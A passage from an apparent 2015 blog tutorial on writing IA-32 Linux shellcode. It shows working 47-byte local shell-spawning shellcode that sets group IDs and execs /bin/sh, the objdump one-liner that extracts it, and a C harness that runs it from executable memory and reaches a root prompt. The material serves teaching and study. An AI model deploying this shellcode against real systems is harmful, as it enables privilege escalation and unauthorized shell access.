</span><span class='line'> 804808c: 73 68                   jae    80480f6 &lt;string_loc+0x74>
</span><span class='line'> 804808e: 4e                      dec    esi</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d shell4 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
</span><span class='line'>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>test.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span><span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class='line'>        <span class="kt">void</span> <span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;allocated executable memory at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;shellcode length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">sc</span><span class="p">));</span>
</span><span class='line'>        <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc</span><span class="p">)))();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# ./test 
</span><span class='line'>allocated executable memory at: 0xb7789000
</span><span class='line'>shellcode length: 47
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>



</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Norbert Szetei</span></span>

      




<time class='entry-date' datetime='2015-06-26T11:08:30+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:08 am</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/exploit/'>exploit</a>, <a class='category' href='/blog/categories/shellcode/'>shellcode</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2/" data-via="" data-counturl="http://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/06/23/ia-32-linux-shellcode-basics-1/" title="Previous Post: IA-32 Linux Shellcode Basics 1">&laquo; IA-32 Linux Shellcode Basics 1</a>
      
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    




  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Norbert Szetei -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
